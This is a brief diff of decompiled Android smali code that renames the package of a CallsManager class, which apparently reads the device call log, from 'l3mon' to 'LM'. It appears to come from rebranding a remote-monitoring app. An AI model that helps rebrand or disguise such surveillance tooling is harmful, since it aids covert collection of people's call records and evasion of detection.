@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/CallsManager;
+.class public Lcom/etechd/LM/CallsManager;
 .super Ljava/lang/Object;
 .source "CallsManager.java"
 
@@ -46,7 +46,7 @@
 
     .line 20
     .local v8, "allCalls":Landroid/net/Uri;
-    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/etechd/LM/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v6
 
